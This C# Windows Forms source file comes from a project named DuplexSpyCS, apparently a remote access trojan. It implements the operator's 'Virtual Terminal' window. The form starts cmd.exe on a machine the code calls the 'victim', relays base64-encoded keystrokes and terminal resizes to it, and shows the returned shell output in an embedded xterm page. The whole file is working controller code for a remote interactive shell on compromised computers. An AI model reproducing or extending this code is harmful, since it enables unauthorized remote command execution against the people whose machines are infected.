using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmXterm : Form
    {
        private clsVictim m_victim { get; init; }
        private string m_szInitDir { get; init; }

        public frmXterm(clsVictim victim, string szInitDir = ".")
        {
            InitializeComponent();

            m_victim = victim;
            m_szInitDir = szInitDir;

            textBox1.Text = @"C:\Windows\System32\cmd.exe";

            Text = @$"Virtual Terminal\\{victim.ID}";
            StartPosition = FormStartPosition.CenterScreen;
        }

        void fnRecv(clsListener listener, clsVictim victim, List<string> lsMsg)
        {
            if (!clsTools.fnbVictimEquals(victim, m_victim))
                return;

            if (lsMsg[0] == "xterm")
            {
                if (lsMsg[1] == "output")
                {
                    Invoke(new Action(() =>
                    {
                        webView21.CoreWebView2.PostWebMessageAsString(lsMsg[2]);
                    }));
                }
            }
        }

        async void fnSetup()
        {
            m_victim.m_listener.ReceivedDecoded += fnRecv;

            await webView21.EnsureCoreWebView2Async();
            webView21.CoreWebView2.Navigate(Path.Combine(Application.StartupPath, "terminal.html"));

            webView21.CoreWebView2.WebMessageReceived += (s, e) =>
            {
                string msg = e.TryGetWebMessageAsString();
                if (msg.StartsWith("xterm|input|"))
                {
                    string b64 = msg.Substring("xterm|input|".Length);
                    m_victim.fnSendCommand(new string[]
                    {
                        "xterm",
                        "input",
                        b64,
                    }, true);
                }
            };

            webView21.CoreWebView2.WebMessageReceived += (s, e) =>
            {
                string msg = e.TryGetWebMessageAsString();
                if (msg.StartsWith("xterm|resize|"))
                {
                    var parts = msg.Split('|');
                    int cols = int.Parse(parts[2]);
                    int rows = int.Parse(parts[3]);

                    m_victim.fnSendCommand(new string[]
                    {
                        "xterm",
                        "resize",
                        cols.ToString(),
                        rows.ToString(),
                    }, true);
                }
            };

            m_victim.fnSendCommand(new string[]
            {
                "xterm",
                "start",
                @textBox1.Text,
                m_szInitDir,
            });
        }

        private void frmXterm_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void frmXterm_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_victim.m_listener.ReceivedDecoded -= fnRecv;

            m_victim.fnSendCommand(new string[]
            {
                "xterm",
                "stop",
            }, true);
        }

        private void frmXterm_SizeChanged(object sender, EventArgs e)
        {

        }

        private void webView21_Resize(object sender, EventArgs e)
        {

        }

        private void frmXterm_Resize(object sender, EventArgs e)
        {
            if (webView21.CoreWebView2 != null)
            {
                webView21.CoreWebView2.ExecuteScriptAsync("fitTerminal();");
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            m_victim.fnSendCommand(new string[]
            {
                "xterm",
                "start",
                @textBox1.Text,
                m_szInitDir,
            }, true);
        }
    }
}
